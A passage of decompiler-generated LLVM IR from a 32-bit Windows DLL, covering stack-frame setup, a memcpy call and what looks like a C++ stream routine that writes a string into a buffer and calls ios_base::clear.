  store i32 %28, i32* %stack_var_-44, align 4, !insn.addr !3479
  store i32 %19, i32* %stack_var_-48, align 4, !insn.addr !3480
  %29 = call i32 @_memcpy.12(), !insn.addr !3481
  %30 = load i32, i32* %11, align 4, !insn.addr !3482
  %31 = add i32 %30, 1, !insn.addr !3483
  store i32 %31, i32* %stack_var_-44, align 4, !insn.addr !3484
  store i32 %19, i32* %stack_var_-48, align 4, !insn.addr !3485
  %32 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !3485
  %33 = call i32 @function_10005ee0(i32 %19, i32 %31), !insn.addr !3486
  store i32 15, i32* %11, align 4, !insn.addr !3487
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !3487
  br label %dec_label_pc_100067d3, !insn.addr !3487

dec_label_pc_100067d3:                            ; preds = %dec_label_pc_10006730, %dec_label_pc_100067af, %dec_label_pc_100067a5, %dec_label_pc_1000679b, %dec_label_pc_10006792
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %34 = add i32 %esp.0.reload, -4, !insn.addr !3488
  %35 = inttoptr i32 %34 to i32*, !insn.addr !3488
  store i32 -1, i32* %35, align 4, !insn.addr !3488
  %36 = add i32 %esp.0.reload, -8, !insn.addr !3489
  %37 = inttoptr i32 %36 to i32*, !insn.addr !3489
  store i32 0, i32* %37, align 4, !insn.addr !3489
  %38 = add i32 %esp.0.reload, -12, !insn.addr !3490
  %39 = inttoptr i32 %38 to i32*, !insn.addr !3490
  %40 = call i32 @function_100051f0(i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3491
  %41 = add i32 %esp.0.reload, -16, !insn.addr !3492
  %42 = inttoptr i32 %41 to i32*, !insn.addr !3492
  store i32 9, i32* %42, align 4, !insn.addr !3492
  %43 = add i32 %esp.0.reload, -20, !insn.addr !3493
  %44 = inttoptr i32 %43 to i32*, !insn.addr !3493
  store i32 ptrtoint ([10 x i8]* @global_var_100392e8 to i32), i32* %44, align 4, !insn.addr !3493
  %45 = call i32 @function_10005100(i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3494
  %46 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3495
  call void @__writefsdword(i32 0, i32 %46), !insn.addr !3496
  ret i32 %1, !insn.addr !3497
}

define i32 @function_10006810() local_unnamed_addr {
dec_label_pc_10006810:
  %ebx.111.reg2mem = alloca i32, !insn.addr !3498
  %esp.712.reg2mem = alloca i32, !insn.addr !3498
  %.in.in.in.reg2mem = alloca i32, !insn.addr !3498
  %esp.6.reg2mem = alloca i32, !insn.addr !3498
  %ebx.0.reg2mem = alloca i32, !insn.addr !3498
  %esp.4.reg2mem = alloca i32, !insn.addr !3498
  %esp.315.reg2mem = alloca i32, !insn.addr !3498
  %esi.317.reg2mem = alloca i32, !insn.addr !3498
  %edi.318.reg2mem = alloca i32, !insn.addr !3498
  %edi.2.reg2mem = alloca i32, !insn.addr !3498
  %esi.2.reg2mem = alloca i32, !insn.addr !3498
  %esp.2.reg2mem = alloca i32, !insn.addr !3498
  %edx.2.reg2mem = alloca i32, !insn.addr !3498
  %esp.1.reg2mem = alloca i32, !insn.addr !3498
  %edx.1.reg2mem = alloca i32, !insn.addr !3498
  %edi.12444.reg2mem = alloca i32, !insn.addr !3498
  %esi.12345.reg2mem = alloca i32, !insn.addr !3498
  %esp.02146.reg2mem = alloca i32, !insn.addr !3498
  %.reg2mem66 = alloca i32, !insn.addr !3498
  %.reg2mem64 = alloca i32, !insn.addr !3498
  %.pre-phi63.reg2mem = alloca i32*, !insn.addr !3498
  %edi.0.reg2mem = alloca i32, !insn.addr !3498
  %esi.0.reg2mem = alloca i32, !insn.addr !3498
  %.reg2mem = alloca i32, !insn.addr !3498
  %ecx.0.reg2mem = alloca i32, !insn.addr !3498
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-68 = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i1, align 1
  %4 = and i32 %0, 1
  %5 = icmp ne i32 %4, 0, !insn.addr !3498
  store i1 %5, i1* %stack_var_-4, align 1, !insn.addr !3498
  %6 = ptrtoint i1* %stack_var_-4 to i32, !insn.addr !3499
  %7 = call i32 @__readfsdword(i32 0), !insn.addr !3500
  store i32 %7, i32* %stack_var_-16, align 4, !insn.addr !3501
  %8 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !3502
  %9 = xor i32 %8, %6, !insn.addr !3503
  store i32 %9, i32* %stack_var_-68, align 4, !insn.addr !3504
  %10 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3505
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !3506
  br label %dec_label_pc_10006851, !insn.addr !3507

dec_label_pc_10006851:                            ; preds = %dec_label_pc_10006851, %dec_label_pc_10006810
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %11 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !3508
  %12 = load i8, i8* %11, align 1, !insn.addr !3508
  %13 = add i32 %ecx.0.reload, 1, !insn.addr !3509
  %14 = icmp eq i8 %12, 0, !insn.addr !3510
  %15 = icmp eq i1 %14, false, !insn.addr !3511
  store i32 %13, i32* %ecx.0.reg2mem, !insn.addr !3511
  br i1 %15, label %dec_label_pc_10006851, label %dec_label_pc_10006858, !insn.addr !3511

dec_label_pc_10006858:                            ; preds = %dec_label_pc_10006851
  %16 = load i32, i32* @global_var_1003df80, align 4, !insn.addr !3512
  %17 = sub i32 %ecx.0.reload, %1, !insn.addr !3513
  %18 = add i32 %16, 4, !insn.addr !3514
  %19 = inttoptr i32 %18 to i32*, !insn.addr !3514
  %20 = load i32, i32* %19, align 4, !insn.addr !3514
  %21 = add i32 %20, ptrtoint (i32* @global_var_1003dfa4 to i32), !insn.addr !3515
  %22 = inttoptr i32 %21 to i32*, !insn.addr !3515
  %23 = load i32, i32* %22, align 4, !insn.addr !3515
  %24 = icmp slt i32 %23, 0, !insn.addr !3516
  br i1 %24, label %dec_label_pc_1000688b, label %dec_label_pc_10006875, !insn.addr !3517

dec_label_pc_10006875:                            ; preds = %dec_label_pc_10006858
  %25 = add i32 %20, ptrtoint (i32* @global_var_1003dfa0 to i32), !insn.addr !3518
  %26 = inttoptr i32 %25 to i32*, !insn.addr !3518
  %27 = load i32, i32* %26, align 4, !insn.addr !3518
  %28 = icmp eq i32 %23, 0, !insn.addr !3516
  %29 = icmp eq i1 %28, false, !insn.addr !3519
  %30 = icmp ugt i32 %27, %17
  %or.cond14 = or i1 %29, %30
  br i1 %or.cond14, label %dec_label_pc_10006885, label %dec_label_pc_1000688b, !insn.addr !3519

dec_label_pc_10006885:                            ; preds = %dec_label_pc_10006875
  %31 = sub i32 %27, %17, !insn.addr !3520
  %32 = icmp ult i32 %27, %17, !insn.addr !3520
  %33 = zext i1 %32 to i32, !insn.addr !3521
  %34 = sub i32 %23, %33, !insn.addr !3521
  store i32 %16, i32* %.reg2mem, !insn.addr !3522
  store i32 %31, i32* %esi.0.reg2mem, !insn.addr !3522
  store i32 %34, i32* %edi.0.reg2mem, !insn.addr !3522
  br label %dec_label_pc_10006899, !insn.addr !3522

dec_label_pc_1000688b:                            ; preds = %dec_label_pc_10006875, %dec_label_pc_10006858
  %35 = call i128 @__asm_xorps(i128 %2, i128 %2), !insn.addr !3523
  %36 = sext i32 %3 to i64, !insn.addr !3524
  call void @__asm_movlpd(i64 %36, i128 %35), !insn.addr !3524
  %.pre = load i32, i32* @global_var_1003df80, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !3525
  br label %dec_label_pc_10006899, !insn.addr !3525

dec_label_pc_10006899:                            ; preds = %dec_label_pc_1000688b, %dec_label_pc_10006885
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %37 = add i32 %20, ptrtoint (i32* @global_var_1003dfb8 to i32), !insn.addr !3526
  %38 = inttoptr i32 %37 to i32*, !insn.addr !3526
  %39 = load i32, i32* %38, align 4, !insn.addr !3526
  %40 = icmp eq i32 %39, 0, !insn.addr !3527
  %spec.select = select i1 %40, i32 %16, i32 %.reload
  %41 = add i32 %spec.select, 4
  %42 = inttoptr i32 %41 to i32*
  %43 = load i32, i32* %42, align 4, !insn.addr !3528
  %44 = add i32 %43, ptrtoint (i32* @global_var_1003df8c to i32)
  %45 = inttoptr i32 %44 to i32*
  %46 = load i32, i32* %45, align 4, !insn.addr !3529
  %47 = icmp eq i32 %46, 0, !insn.addr !3529
  %48 = icmp eq i1 %47, false, !insn.addr !3530
  store i32* %45, i32** %.pre-phi63.reg2mem, !insn.addr !3530
  store i32 %43, i32* %.reg2mem64, !insn.addr !3530
  br i1 %48, label %dec_label_pc_100068e3, label %dec_label_pc_100068c7, !insn.addr !3530

dec_label_pc_100068c7:                            ; preds = %dec_label_pc_10006899
  %49 = add i32 %43, ptrtoint (i32* @global_var_1003dfbc to i32), !insn.addr !3531
  %50 = inttoptr i32 %49 to i32*, !insn.addr !3531
  %51 = load i32, i32* %50, align 4, !insn.addr !3531
  %52 = icmp eq i32 %51, 0, !insn.addr !3532
  %53 = icmp eq i32 %51, ptrtoint (i32* @global_var_1003df80 to i32), !insn.addr !3533
  %or.cond = or i1 %52, %53
  %spec.select8 = select i1 %or.cond, i32 %spec.select, i32 %.reload
  %.pre39 = add i32 %spec.select8, 4, !insn.addr !3534
  %.pre40 = inttoptr i32 %.pre39 to i32*, !insn.addr !3534
  %.pre59 = load i32, i32* %.pre40, align 4
  %.pre61 = add i32 %.pre59, ptrtoint (i32* @global_var_1003df8c to i32), !insn.addr !3535
  %.pre62 = inttoptr i32 %.pre61 to i32*, !insn.addr !3535
  store i32* %.pre62, i32** %.pre-phi63.reg2mem
  store i32 %.pre59, i32* %.reg2mem64
  br label %dec_label_pc_100068e3

dec_label_pc_100068e3:                            ; preds = %dec_label_pc_100068c7, %dec_label_pc_10006899
  %54 = ptrtoint i32* %stack_var_-68 to i32, !insn.addr !3504
  %.pre-phi63.reload = load i32*, i32** %.pre-phi63.reg2mem
  %55 = load i32, i32* %.pre-phi63.reload, align 4, !insn.addr !3535
  %56 = icmp eq i32 %55, 0, !insn.addr !3535
  %57 = icmp eq i1 %56, false, !insn.addr !3536
  %58 = icmp eq i1 %57, false, !insn.addr !3537
  store i32 %.reload, i32* %.in.in.in.reg2mem, !insn.addr !3537
  store i32 %54, i32* %esp.712.reg2mem, !insn.addr !3537
  store i32 4, i32* %ebx.111.reg2mem, !insn.addr !3537
  br i1 %58, label %dec_label_pc_10006908, label %dec_label_pc_10006a85, !insn.addr !3537

dec_label_pc_10006908:                            ; preds = %dec_label_pc_100068e3
  %.reload65 = load i32, i32* %.reg2mem64, !insn.addr !3534
  %59 = add i32 %.reload65, ptrtoint (i32* @global_var_1003df94 to i32), !insn.addr !3538
  %60 = inttoptr i32 %59 to i32*, !insn.addr !3538
  %61 = load i32, i32* %60, align 4, !insn.addr !3538
  %62 = and i32 %61, 448, !insn.addr !3539
  %63 = icmp eq i32 %62, 64, !insn.addr !3540
  %64 = icmp slt i32 %edi.0.reload, 0, !insn.addr !3541
  %or.cond42 = or i1 %64, %63
  store i32 %20, i32* %edx.2.reg2mem, !insn.addr !3542
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !3542
  store i32 %esi.0.reload, i32* %esi.2.reg2mem, !insn.addr !3542
  store i32 %edi.0.reload, i32* %edi.2.reg2mem, !insn.addr !3542
  br i1 %or.cond42, label %dec_label_pc_1000698c, label %dec_label_pc_10006924.preheader, !insn.addr !3542

dec_label_pc_10006924.preheader:                  ; preds = %dec_label_pc_10006908
  %65 = icmp eq i32 %edi.0.reload, 0, !insn.addr !3541
  %66 = icmp eq i1 %65, false, !insn.addr !3543
  %67 = icmp ne i1 %66, true, !insn.addr !3543
  %68 = icmp eq i32 %esi.0.reload, 0, !insn.addr !3544
  %or.cond443 = icmp eq i1 %68, %67
  store i32 %.reload, i32* %.reg2mem66, !insn.addr !3543
  store i32 %54, i32* %esp.02146.reg2mem, !insn.addr !3543
  store i32 %esi.0.reload, i32* %esi.12345.reg2mem, !insn.addr !3543
  store i32 %edi.0.reload, i32* %edi.12444.reg2mem, !insn.addr !3543
  store i32 %20, i32* %edx.2.reg2mem, !insn.addr !3543
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !3543
  store i32 0, i32* %esi.2.reg2mem, !insn.addr !3543
  store i32 %edi.0.reload, i32* %edi.2.reg2mem, !insn.addr !3543
  br i1 %or.cond443, label %dec_label_pc_1000698c, label %dec_label_pc_1000692a, !insn.addr !3543

dec_label_pc_10006924:                            ; preds = %dec_label_pc_1000697c
  %69 = icmp eq i32 %109, 0, !insn.addr !3541
  %70 = icmp eq i1 %69, false, !insn.addr !3543
  %71 = icmp ne i1 %70, true, !insn.addr !3543
  %72 = icmp eq i32 %105, 0, !insn.addr !3544
  %or.cond4 = icmp eq i1 %72, %71
  store i32 %edx.1.reload, i32* %edx.2.reg2mem, !insn.addr !3543
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !3543
  store i32 0, i32* %esi.2.reg2mem, !insn.addr !3543
  store i32 %109, i32* %edi.2.reg2mem, !insn.addr !3543
  br i1 %or.cond4, label %dec_label_pc_1000698c, label %dec_label_pc_10006924.dec_label_pc_1000692a_crit_edge, !insn.addr !3543

dec_label_pc_10006924.dec_label_pc_1000692a_crit_edge: ; preds = %dec_label_pc_10006924
  %.pre60 = load i32, i32* @global_var_1003df80, align 4
  store i32 %.pre60, i32* %.reg2mem66
  store i32 %esp.1.reload, i32* %esp.02146.reg2mem
  store i32 %105, i32* %esi.12345.reg2mem
  store i32 %109, i32* %edi.12444.reg2mem
  br label %dec_label_pc_1000692a

dec_label_pc_1000692a:                            ; preds = %dec_label_pc_10006924.preheader, %dec_label_pc_10006924.dec_label_pc_1000692a_crit_edge
  %edi.12444.reload = load i32, i32* %edi.12444.reg2mem
  %esi.12345.reload = load i32, i32* %esi.12345.reg2mem
  %esp.02146.reload = load i32, i32* %esp.02146.reg2mem
  %.reload67 = load i32, i32* %.reg2mem66, !insn.addr !3545
  %73 = add i32 %.reload67, 4, !insn.addr !3546
  %74 = inttoptr i32 %73 to i32*, !insn.addr !3546
  %75 = load i32, i32* %74, align 4, !insn.addr !3546
  %76 = add i32 %75, ptrtoint (i8** @global_var_1003dfc0 to i32), !insn.addr !3547
  %77 = inttoptr i32 %76 to i8*, !insn.addr !3547
  %78 = load i8, i8* %77, align 1, !insn.addr !3547
  %79 = add i32 %75, ptrtoint (i32* @global_var_1003dfb8 to i32), !insn.addr !3548
  %80 = inttoptr i32 %79 to i32*, !insn.addr !3548
  %81 = load i32, i32* %80, align 4, !insn.addr !3548
  %82 = add i32 %81, 32, !insn.addr !3549
  %83 = inttoptr i32 %82 to i32*, !insn.addr !3549
  %84 = load i32, i32* %83, align 4, !insn.addr !3549
  %85 = inttoptr i32 %84 to i32*, !insn.addr !3550
  %86 = load i32, i32* %85, align 4, !insn.addr !3550
  %87 = icmp eq i32 %86, 0, !insn.addr !3550
  br i1 %87, label %dec_label_pc_10006969, label %dec_label_pc_10006949, !insn.addr !3551

dec_label_pc_10006949:                            ; preds = %dec_label_pc_1000692a
  %88 = add i32 %81, 48, !insn.addr !3552
  %89 = inttoptr i32 %88 to i32*, !insn.addr !3552
  %90 = load i32, i32* %89, align 4, !insn.addr !3552
  %91 = inttoptr i32 %90 to i32*, !insn.addr !3553
  %92 = load i32, i32* %91, align 4, !insn.addr !3553
  %93 = icmp slt i32 %92, 1
  br i1 %93, label %dec_label_pc_10006969, label %dec_label_pc_10006952, !insn.addr !3554

dec_label_pc_10006952:                            ; preds = %dec_label_pc_10006949
  %94 = add i32 %92, -1, !insn.addr !3555
  store i32 %94, i32* %91, align 4, !insn.addr !3556
  %95 = load i32, i32* %83, align 4, !insn.addr !3557
  %96 = inttoptr i32 %95 to i32*, !insn.addr !3558
  %97 = load i32, i32* %96, align 4, !insn.addr !3558
  %98 = add i32 %97, 1, !insn.addr !3559
  store i32 %98, i32* %96, align 4, !insn.addr !3560
  %99 = inttoptr i32 %97 to i8*, !insn.addr !3561
  store i8 %78, i8* %99, align 1, !insn.addr !3561
  store i32 %97, i32* %edx.1.reg2mem, !insn.addr !3562
  store i32 %esp.02146.reload, i32* %esp.1.reg2mem, !insn.addr !3562
  br label %dec_label_pc_1000697c, !insn.addr !3562

dec_label_pc_10006969:                            ; preds = %dec_label_pc_10006949, %dec_label_pc_1000692a
  %100 = zext i8 %78 to i32, !insn.addr !3563
  %101 = inttoptr i32 %81 to i32*, !insn.addr !3564
  %102 = load i32, i32* %101, align 4, !insn.addr !3564
  %103 = add i32 %esp.02146.reload, -4, !insn.addr !3565
  %104 = inttoptr i32 %103 to i32*, !insn.addr !3565
  store i32 %100, i32* %104, align 4, !insn.addr !3565
  store i32 %102, i32* %edx.1.reg2mem, !insn.addr !3566
  store i32 %103, i32* %esp.1.reg2mem, !insn.addr !3566
  br label %dec_label_pc_1000697c, !insn.addr !3566

dec_label_pc_1000697c:                            ; preds = %dec_label_pc_10006952, %dec_label_pc_10006969
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %105 = add i32 %esi.12345.reload, -1, !insn.addr !3567
  %106 = icmp ne i32 %esi.12345.reload, 0, !insn.addr !3567
  %107 = zext i1 %106 to i32, !insn.addr !3568
  %108 = add i32 %edi.12444.reload, -1, !insn.addr !3568
  %109 = add i32 %108, %107, !insn.addr !3568
  %110 = icmp slt i32 %109, 0, !insn.addr !3541
  store i32 %edx.1.reload, i32* %edx.2.reg2mem, !insn.addr !3569
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !3569
  store i32 %105, i32* %esi.2.reg2mem, !insn.addr !3569
  store i32 -1, i32* %edi.2.reg2mem, !insn.addr !3569
  br i1 %110, label %dec_label_pc_1000698c, label %dec_label_pc_10006924, !insn.addr !3569

dec_label_pc_1000698c:                            ; preds = %dec_label_pc_10006924.preheader, %dec_label_pc_1000697c, %dec_label_pc_10006924, %dec_label_pc_10006908
  %edi.2.reload = load i32, i32* %edi.2.reg2mem
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %111 = add i32 %esp.2.reload, -4, !insn.addr !3570
  %112 = inttoptr i32 %111 to i32*, !insn.addr !3570
  store i32 0, i32* %112, align 4, !insn.addr !3570
  %113 = add i32 %esp.2.reload, -8, !insn.addr !3571
  %114 = inttoptr i32 %113 to i32*, !insn.addr !3571
  store i32 %17, i32* %114, align 4, !insn.addr !3571
  %115 = load i32, i32* @global_var_1003df80, align 4, !insn.addr !3572
  %116 = add i32 %esp.2.reload, -12, !insn.addr !3573
  %117 = add i32 %115, 4, !insn.addr !3574
  %118 = inttoptr i32 %117 to i32*, !insn.addr !3574
  %119 = load i32, i32* %118, align 4, !insn.addr !3574
  %120 = add i32 %119, ptrtoint (i32* @global_var_1003dfb8 to i32), !insn.addr !3575
  %121 = inttoptr i32 %120 to i32*, !insn.addr !3575
  %122 = load i32, i32* %121, align 4, !insn.addr !3575
  %123 = inttoptr i32 %122 to i32*, !insn.addr !3576
  %124 = load i32, i32* %123, align 4, !insn.addr !3576
  %125 = add i32 %124, 36, !insn.addr !3577
  %126 = inttoptr i32 %125 to i32*, !insn.addr !3577
  %127 = load i32, i32* %126, align 4, !insn.addr !3577
  %128 = icmp eq i32 %127, %17, !insn.addr !3578
  %129 = icmp eq i32 %edx.2.reload, 0, !insn.addr !3579
  %130 = icmp eq i1 %129, %128
  store i32 4, i32* %ebx.0.reg2mem, !insn.addr !3580
  store i32 %116, i32* %esp.6.reg2mem, !insn.addr !3580
  br i1 %130, label %dec_label_pc_100069b2.preheader, label %dec_label_pc_10006a7a, !insn.addr !3580

dec_label_pc_100069b2.preheader:                  ; preds = %dec_label_pc_1000698c
  %131 = inttoptr i32 %116 to i32*, !insn.addr !3573
  %132 = icmp slt i32 %edi.2.reload, 0, !insn.addr !3581
  store i32 %edi.2.reload, i32* %edi.318.reg2mem, !insn.addr !3582
  store i32 %esi.2.reload, i32* %esi.317.reg2mem, !insn.addr !3582
  store i32 %116, i32* %esp.315.reg2mem, !insn.addr !3582
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !3582
  store i32 %116, i32* %esp.6.reg2mem, !insn.addr !3582
  br i1 %132, label %dec_label_pc_10006a7a, label %dec_label_pc_100069b6, !insn.addr !3582

dec_label_pc_100069b6:                            ; preds = %dec_label_pc_100069b2.preheader, %dec_label_pc_10006a11
  %esp.315.reload = load i32, i32* %esp.315.reg2mem
  %esi.317.reload = load i32, i32* %esi.317.reg2mem
  %edi.318.reload = load i32, i32* %edi.318.reg2mem
  %133 = icmp eq i32 %edi.318.reload, 0, !insn.addr !3581
  %134 = icmp eq i1 %133, false, !insn.addr !3583
  %135 = icmp ne i1 %134, true, !insn.addr !3583
  %136 = icmp eq i32 %esi.317.reload, 0, !insn.addr !3584
  %or.cond6 = icmp eq i1 %136, %135
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !3583
  store i32 %esp.315.reload, i32* %esp.6.reg2mem, !insn.addr !3583
  br i1 %or.cond6, label %dec_label_pc_10006a7a, label %dec_label_pc_100069bc, !insn.addr !3583

dec_label_pc_100069bc:                            ; preds = %dec_label_pc_100069b6
  %137 = load i32, i32* @global_var_1003df80, align 4, !insn.addr !3585
  %138 = add i32 %137, 4, !insn.addr !3586
  %139 = inttoptr i32 %138 to i32*, !insn.addr !3586
  %140 = load i32, i32* %139, align 4, !insn.addr !3586
  %141 = add i32 %140, ptrtoint (i32* @global_var_1003dfb8 to i32), !insn.addr !3587
  %142 = inttoptr i32 %141 to i32*, !insn.addr !3587
  %143 = load i32, i32* %142, align 4, !insn.addr !3587
  %144 = add i32 %140, ptrtoint (i8** @global_var_1003dfc0 to i32), !insn.addr !3588
  %145 = inttoptr i32 %144 to i8*, !insn.addr !3588
  %146 = load i8, i8* %145, align 1, !insn.addr !3588
  %147 = add i32 %143, 32, !insn.addr !3589
  %148 = inttoptr i32 %147 to i32*, !insn.addr !3589
  %149 = load i32, i32* %148, align 4, !insn.addr !3589
  %150 = inttoptr i32 %149 to i32*, !insn.addr !3590
  %151 = load i32, i32* %150, align 4, !insn.addr !3590
  %152 = icmp eq i32 %151, 0, !insn.addr !3590
  br i1 %152, label %dec_label_pc_100069fe, label %dec_label_pc_100069db, !insn.addr !3591

dec_label_pc_100069db:                            ; preds = %dec_label_pc_100069bc
  %153 = add i32 %143, 48, !insn.addr !3592
  %154 = inttoptr i32 %153 to i32*, !insn.addr !3592
  %155 = load i32, i32* %154, align 4, !insn.addr !3592
  %156 = inttoptr i32 %155 to i32*, !insn.addr !3593
  %157 = load i32, i32* %156, align 4, !insn.addr !3593
  %158 = icmp slt i32 %157, 1
  br i1 %158, label %dec_label_pc_100069fe, label %dec_label_pc_100069e4, !insn.addr !3594

dec_label_pc_100069e4:                            ; preds = %dec_label_pc_100069db
  %159 = add i32 %157, -1, !insn.addr !3595
  store i32 %159, i32* %156, align 4, !insn.addr !3596
  %160 = load i32, i32* %148, align 4, !insn.addr !3597
  %161 = inttoptr i32 %160 to i32*, !insn.addr !3598
  %162 = load i32, i32* %161, align 4, !insn.addr !3598
  %163 = add i32 %162, 1, !insn.addr !3599
  store i32 %163, i32* %161, align 4, !insn.addr !3600
  %164 = inttoptr i32 %162 to i8*, !insn.addr !3601
  store i8 %146, i8* %164, align 1, !insn.addr !3601
  store i32 %esp.315.reload, i32* %esp.4.reg2mem, !insn.addr !3602
  br label %dec_label_pc_10006a11, !insn.addr !3602

dec_label_pc_100069fe:                            ; preds = %dec_label_pc_100069db, %dec_label_pc_100069bc
  %165 = zext i8 %146 to i32, !insn.addr !3588
  %166 = add i32 %esp.315.reload, -4, !insn.addr !3603
  %167 = inttoptr i32 %166 to i32*, !insn.addr !3603
  store i32 %165, i32* %167, align 4, !insn.addr !3603
  store i32 %166, i32* %esp.4.reg2mem, !insn.addr !3604
  br label %dec_label_pc_10006a11, !insn.addr !3604

dec_label_pc_10006a11:                            ; preds = %dec_label_pc_100069e4, %dec_label_pc_100069fe
  %esp.4.reload = load i32, i32* %esp.4.reg2mem
  %168 = add i32 %esi.317.reload, -1, !insn.addr !3605
  %169 = icmp ne i32 %esi.317.reload, 0, !insn.addr !3605
  %170 = zext i1 %169 to i32, !insn.addr !3606
  %171 = add i32 %edi.318.reload, -1, !insn.addr !3606
  %172 = add i32 %171, %170, !insn.addr !3606
  %173 = icmp slt i32 %172, 0, !insn.addr !3581
  store i32 %172, i32* %edi.318.reg2mem, !insn.addr !3582
  store i32 %168, i32* %esi.317.reg2mem, !insn.addr !3582
  store i32 %esp.4.reload, i32* %esp.315.reg2mem, !insn.addr !3582
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !3582
  store i32 %esp.4.reload, i32* %esp.6.reg2mem, !insn.addr !3582
  br i1 %173, label %dec_label_pc_10006a7a, label %dec_label_pc_100069b6, !insn.addr !3582

dec_label_pc_10006a7a:                            ; preds = %dec_label_pc_100069b6, %dec_label_pc_10006a11, %dec_label_pc_100069b2.preheader, %dec_label_pc_1000698c
  %esp.6.reload = load i32, i32* %esp.6.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %174 = load i32, i32* @global_var_1003df80, align 4, !insn.addr !3607
  %175 = add i32 %174, 4, !insn.addr !3608
  %176 = inttoptr i32 %175 to i32*, !insn.addr !3608
  %177 = load i32, i32* %176, align 4, !insn.addr !3608
  %178 = add i32 %177, ptrtoint (i32* @global_var_1003dfa0 to i32), !insn.addr !3609
  %179 = inttoptr i32 %178 to i32*, !insn.addr !3609
  store i32 0, i32* %179, align 4, !insn.addr !3609
  %180 = add i32 %177, ptrtoint (i32* @global_var_1003dfa4 to i32), !insn.addr !3610
  %181 = inttoptr i32 %180 to i32*, !insn.addr !3610
  store i32 0, i32* %181, align 4, !insn.addr !3610
  %182 = icmp eq i32 %ebx.0.reload, 0, !insn.addr !3611
  br i1 %182, label %dec_label_pc_10006a9e, label %dec_label_pc_10006a7a.dec_label_pc_10006a85_crit_edge, !insn.addr !3612

dec_label_pc_10006a7a.dec_label_pc_10006a85_crit_edge: ; preds = %dec_label_pc_10006a7a
  %.in.in.in.pre = load i32, i32* @global_var_1003df80, align 4
  store i32 %.in.in.in.pre, i32* %.in.in.in.reg2mem
  store i32 %esp.6.reload, i32* %esp.712.reg2mem
  store i32 %ebx.0.reload, i32* %ebx.111.reg2mem
  br label %dec_label_pc_10006a85

dec_label_pc_10006a85:                            ; preds = %dec_label_pc_10006a7a.dec_label_pc_10006a85_crit_edge, %dec_label_pc_100068e3
  %ebx.111.reload = load i32, i32* %ebx.111.reg2mem
  %esp.712.reload = load i32, i32* %esp.712.reg2mem
  %.in.in.in.reload = load i32, i32* %.in.in.in.reg2mem
  %.in.in = add i32 %.in.in.in.reload, 4
  %.in = inttoptr i32 %.in.in to i32*
  %183 = load i32, i32* %.in, align 4
  %184 = add i32 %183, ptrtoint (i32* @global_var_1003df80 to i32), !insn.addr !3613
  %185 = add i32 %183, add (i32 ptrtoint (i32* @global_var_1003df80 to i32), i32 12), !insn.addr !3614
  %186 = inttoptr i32 %185 to i32*, !insn.addr !3614
  %187 = load i32, i32* %186, align 4, !insn.addr !3614
  %188 = add i32 %183, add (i32 ptrtoint (i32* @global_var_1003df80 to i32), i32 56), !insn.addr !3615
  %189 = inttoptr i32 %188 to i32*, !insn.addr !3615
  %190 = load i32, i32* %189, align 4, !insn.addr !3615
  %191 = icmp eq i32 %190, 0, !insn.addr !3615
  %192 = add i32 %esp.712.reload, -4, !insn.addr !3616
  %193 = inttoptr i32 %192 to i32*, !insn.addr !3616
  store i32 0, i32* %193, align 4, !insn.addr !3616
  %194 = icmp eq i1 %191, false, !insn.addr !3617
  %.v = select i1 %194, i32 %ebx.111.reload, i32 4
  %195 = or i32 %.v, %187, !insn.addr !3617
  %196 = add i32 %esp.712.reload, -8, !insn.addr !3618
  %197 = inttoptr i32 %196 to i32*, !insn.addr !3618
  store i32 %195, i32* %197, align 4, !insn.addr !3618
  %198 = inttoptr i32 %184 to i32*, !insn.addr !3619
  call void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %198, i32 ptrtoint (i32* @1 to i32), i1 ptrtoint (i32* @1 to i1)), !insn.addr !3619
  br label %dec_label_pc_10006a9e, !insn.addr !3619

dec_label_pc_10006a9e:                            ; preds = %dec_label_pc_10006a85, %dec_label_pc_10006a7a
  %199 = call i32 @function_1000e737(), !insn.addr !3620
  %200 = trunc i32 %199 to i8, !insn.addr !3621
  %201 = icmp eq i8 %200, 0, !insn.addr !3621
  %202 = icmp eq i1 %201, false, !insn.addr !3622
  br i1 %202, label %dec_label_pc_10006ab8, label %dec_label_pc_10006ab1, !insn.addr !3622

dec_label_pc_10006ab1:                            ; preds = %dec_label_pc_10006a9e
  %203 = call i32 @function_10006260(), !insn.addr !3623
  br label %dec_label_pc_10006ab8, !insn.addr !3623

dec_label_pc_10006ab8:                            ; preds = %dec_label_pc_10006ab1, %dec_label_pc_10006a9e
  %204 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3624
  call void @__writefsdword(i32 0, i32 %204), !insn.addr !3625
